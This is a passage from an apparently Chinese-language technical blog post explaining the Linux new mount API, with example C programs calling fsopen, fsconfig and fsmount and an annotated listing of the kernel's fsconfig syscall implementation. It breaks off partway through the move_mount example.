<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/mount.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsopen</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsopen 430</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsconfig</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsconfig 431</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fs_name, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsopen, fs_name, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsconfig</span><span class="params">(<span class="keyword">int</span> fsfd, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">const</span> <span class="keyword">char</span> *key, <span class="keyword">const</span> <span class="keyword">void</span> *val, <span class="keyword">int</span> aux)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fs_fd;</span><br><span class="line">    </span><br><span class="line">    fs_fd = fsopen(<span class="string">&quot;ext4&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fs_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] FAILED to fsopen!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);</span><br><span class="line"></span><br><span class="line">    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="string">&quot;source&quot;</span>, <span class="string">&quot;/dev/sdb1&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>fsconfig()</code> 系统调用根据不同的 cmd 进行不同的操作，对于挂载文件系统而言其核心操作主要就是两个 cmd：</p>
<ul>
<li>  <code>FSCONFIG_SET_STRING</code> ：设置不同的键值对参数</li>
<li>  <code>FSCONFIG_CMD_CREATE</code>：获得一个 superblock 并创建一个 root entry</li>
</ul>
<p>示例用法如上所示，这里创建了一个键值对 <code>&quot;source&quot;=/dev/sdb1</code> 表示文件系统源所在的设备名</p>
<p>在内核中也是<code>fsconfig</code>的实现也是比较长，主要根据不同的cmd进入到不同的swith分支</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE5(fsconfig,</span><br><span class="line">		<span class="keyword">int</span>, fd,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span>, cmd,</span><br><span class="line">		<span class="keyword">const</span> <span class="keyword">char</span> __user *, _key,</span><br><span class="line">		<span class="keyword">const</span> <span class="keyword">void</span> __user *, _value,</span><br><span class="line">		<span class="keyword">int</span>, aux)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fs_context</span> *<span class="title">fc</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fs_parameter</span> <span class="title">param</span> =</span> &#123;</span><br><span class="line">		.type	= fs_value_is_undefined,</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_FLAG:</span><br><span class="line">		<span class="keyword">if</span> (!_key || _value || aux)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_STRING:</span><br><span class="line">		<span class="keyword">if</span> (!_key || !_value || aux)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_BINARY:</span><br><span class="line">		<span class="keyword">if</span> (!_key || !_value || aux &lt;= <span class="number">0</span> || aux &gt; <span class="number">1024</span> * <span class="number">1024</span>)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_PATH:</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_PATH_EMPTY:</span><br><span class="line">		<span class="keyword">if</span> (!_key || !_value || (aux != AT_FDCWD &amp;&amp; aux &lt; <span class="number">0</span>))</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_FD:</span><br><span class="line">		<span class="keyword">if</span> (!_key || _value || aux &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_CMD_CREATE:</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_CMD_RECONFIGURE:</span><br><span class="line">		<span class="keyword">if</span> (_key || _value || aux)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	f = fdget(fd);</span><br><span class="line">	<span class="keyword">if</span> (!f.file)</span><br><span class="line">		<span class="keyword">return</span> -EBADF;</span><br><span class="line">	ret = -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (f.file-&gt;f_op != &amp;fscontext_fops)</span><br><span class="line">		<span class="keyword">goto</span> out_f;</span><br><span class="line"></span><br><span class="line">	fc = f.file-&gt;private_data;</span><br><span class="line">	<span class="keyword">if</span> (fc-&gt;ops == &amp;legacy_fs_context_ops) &#123;</span><br><span class="line">		<span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">		<span class="keyword">case</span> FSCONFIG_SET_BINARY:</span><br><span class="line">		<span class="keyword">case</span> FSCONFIG_SET_PATH:</span><br><span class="line">		<span class="keyword">case</span> FSCONFIG_SET_PATH_EMPTY:</span><br><span class="line">		<span class="keyword">case</span> FSCONFIG_SET_FD:</span><br><span class="line">			ret = -EOPNOTSUPP;</span><br><span class="line">			<span class="keyword">goto</span> out_f;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (_key) &#123;</span><br><span class="line">		param.key = strndup_user(_key, <span class="number">256</span>);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(param.key)) &#123;</span><br><span class="line">			ret = PTR_ERR(param.key);</span><br><span class="line">			<span class="keyword">goto</span> out_f;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_FLAG:</span><br><span class="line">		param.type = fs_value_is_flag;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_STRING:</span><br><span class="line">		param.type = fs_value_is_string;</span><br><span class="line">		param.<span class="built_in">string</span> = strndup_user(_value, <span class="number">256</span>);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(param.<span class="built_in">string</span>)) &#123;</span><br><span class="line">			ret = PTR_ERR(param.<span class="built_in">string</span>);</span><br><span class="line">			<span class="keyword">goto</span> out_key;</span><br><span class="line">		&#125;</span><br><span class="line">		param.size = <span class="built_in">strlen</span>(param.<span class="built_in">string</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_BINARY:</span><br><span class="line">		param.type = fs_value_is_blob;</span><br><span class="line">		param.size = aux;</span><br><span class="line">		param.blob = memdup_user_nul(_value, aux);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(param.blob)) &#123;</span><br><span class="line">			ret = PTR_ERR(param.blob);</span><br><span class="line">			<span class="keyword">goto</span> out_key;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_PATH:</span><br><span class="line">		param.type = fs_value_is_filename;</span><br><span class="line">		param.name = getname_flags(_value, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(param.name)) &#123;</span><br><span class="line">			ret = PTR_ERR(param.name);</span><br><span class="line">			<span class="keyword">goto</span> out_key;</span><br><span class="line">		&#125;</span><br><span class="line">		param.dirfd = aux;</span><br><span class="line">		param.size = <span class="built_in">strlen</span>(param.name-&gt;name);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_PATH_EMPTY:</span><br><span class="line">		param.type = fs_value_is_filename_empty;</span><br><span class="line">		param.name = getname_flags(_value, LOOKUP_EMPTY, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(param.name)) &#123;</span><br><span class="line">			ret = PTR_ERR(param.name);</span><br><span class="line">			<span class="keyword">goto</span> out_key;</span><br><span class="line">		&#125;</span><br><span class="line">		param.dirfd = aux;</span><br><span class="line">		param.size = <span class="built_in">strlen</span>(param.name-&gt;name);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_FD:</span><br><span class="line">		param.type = fs_value_is_file;</span><br><span class="line">		ret = -EBADF;</span><br><span class="line">		param.file = fget(aux);</span><br><span class="line">		<span class="keyword">if</span> (!param.file)</span><br><span class="line">			<span class="keyword">goto</span> out_key;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = mutex_lock_interruptible(&amp;fc-&gt;uapi_mutex);</span><br><span class="line">	<span class="keyword">if</span> (ret == <span class="number">0</span>) &#123;</span><br><span class="line">		ret = vfs_fsconfig_locked(fc, cmd, &amp;param);</span><br><span class="line">		mutex_unlock(&amp;fc-&gt;uapi_mutex);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Clean up the our record of any value that we obtained from</span></span><br><span class="line"><span class="comment">	 * userspace.  Note that the value may have been stolen by the LSM or</span></span><br><span class="line"><span class="comment">	 * filesystem, in which case the value pointer will have been cleared.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_STRING:</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_BINARY:</span><br><span class="line">		kfree(param.<span class="built_in">string</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_PATH:</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_PATH_EMPTY:</span><br><span class="line">		<span class="keyword">if</span> (param.name)</span><br><span class="line">			putname(param.name);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_SET_FD:</span><br><span class="line">		<span class="keyword">if</span> (param.file)</span><br><span class="line">			fput(param.file);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">out_key:</span><br><span class="line">	kfree(param.key);</span><br><span class="line">out_f:</span><br><span class="line">	fdput(f);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在前面主要操作是对参数进行各种检测，紧接着获取到文件描述符，接着获取<code>fs_config</code>，随后拷贝key字段到内核中，最终根据不同的cmd进入switch</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> FSCONFIG_SET_STRING:</span><br><span class="line">		param.type = fs_value_is_string;</span><br><span class="line">		param.<span class="built_in">string</span> = strndup_user(_value, <span class="number">256</span>);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(param.<span class="built_in">string</span>)) &#123;</span><br><span class="line">			ret = PTR_ERR(param.<span class="built_in">string</span>);</span><br><span class="line">			<span class="keyword">goto</span> out_key;</span><br><span class="line">		&#125;</span><br><span class="line">		param.size = <span class="built_in">strlen</span>(param.<span class="built_in">string</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>这里主要关注这一个分支，在分支中设置完<code>param</code>之后进入后续流程，最终进入到<code>vfs_fsconfig_locked</code>函数进行处理。</p>
<h3 id="fsmount"><a href="#fsmount" class="headerlink" title="fsmount"></a>fsmount</h3><p>完成了文件系统上下文的创建与配置，接下来终于来到文件系统的挂载操作了，<code>fsmount()</code> 系统调用用以获取一个可以被用以进行挂载的挂载实例，并返回一个文件描述符用以下一步的挂载</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/mount.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsopen</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsopen 430</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsconfig</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsconfig 431</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsmount</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsmount 432</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fs_name, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsopen, fs_name, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsconfig</span><span class="params">(<span class="keyword">int</span> fsfd, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">const</span> <span class="keyword">char</span> *key, <span class="keyword">const</span> <span class="keyword">void</span> *val, <span class="keyword">int</span> aux)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsmount</span><span class="params">(<span class="keyword">int</span> fsfd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">unsigned</span> <span class="keyword">int</span> ms_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsmount, fsfd, flags, ms_flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fs_fd, mount_fd;</span><br><span class="line">    </span><br><span class="line">    fs_fd = fsopen(<span class="string">&quot;ext4&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fs_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] FAILED to fsopen!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);</span><br><span class="line"></span><br><span class="line">    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="string">&quot;source&quot;</span>, <span class="string">&quot;/dev/sdb1&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    mount_fd = fsmount(fs_fd, FSMOUNT_CLOEXEC, MOUNT_ATTR_RELATIME);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="move-mount"><a href="#move-mount" class="headerlink" title="move_mount"></a>move_mount</h3><p>最后使用<code>move_mount</code>系统调用将挂载实例在挂载点之间移动，对于尚未进行挂载的挂载实例而言，进行挂载的操作便是从空挂载点 <code>&quot;&quot;</code> 移动到对应的挂载点（例如 <code>&quot;/mnt/temp&quot;</code>），此时我们并不需要给出目的挂载点的 fd，而可以使用 <code>AT_FDCWD</code>，引入了 <code>move_mount()</code> 之后，我们最终的一个用以将 <code>&quot;/dev/sdb1&quot;</code> 以 <code>&quot;ext4&quot;</code> 文件系统挂载到 <code>&quot;/mnt/temp&quot;</code> 的完整示例程序如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsopen</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsopen 430</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsconfig</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsconfig 431</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsmount</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsmount 432</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_move_mount</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_move_mount 429</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fs_name, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsopen, fs_name, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsconfig</span><span class="params">(<span class="keyword">int</span> fsfd, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">const</span> <span class="keyword">char</span> *key, <span class="keyword">const</span> <span class="keyword">void</span> *val, <span class="keyword">int</span> aux)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, 